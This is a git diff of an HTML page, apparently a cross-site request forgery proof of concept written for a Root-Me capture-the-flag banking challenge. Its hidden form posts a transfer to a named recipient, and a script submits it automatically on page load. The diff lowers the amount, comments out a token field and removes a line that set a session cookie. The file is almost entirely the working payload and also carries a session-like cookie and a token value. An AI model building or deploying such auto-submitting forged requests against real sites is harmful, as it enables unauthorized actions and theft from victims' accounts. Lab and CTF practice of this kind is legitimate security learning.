@@ -10,13 +10,11 @@
   <!-- Formulario para enviar la transferencia -->
   <form id="csrfForm" action="https://bankme-2.challenges.pro.root-me.org/transfer" method="POST">
     <input type="hidden" name="recipient" value="bill_portes">
-    <input type="hidden" name="amount" value="2">
-    <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6YmFndTo5Mg%253d%253d">
+    <input type="hidden" name="amount" value="1">
+    <!-- <input type="hidden" name="token" value="Q1NSRnNfNHIzX2MwMGw6YmFndTo5Mg%253d%253d"> -->
   </form>
 
   <script>
-    // Establecer la cookie manualmente
-    document.cookie = "bankme2-session=eyJ1c2VybmFtZSI6ImJhZ3UifQ.Z7s3vg.wS-QYMeG7dbow83SXl1vvUhU6IQ; path=/; domain=bankme-2.challenges.pro.root-me.org";
     // Enviar el formulario automáticamente al cargar la página
     document.getElementById('csrfForm').submit();
   </script>
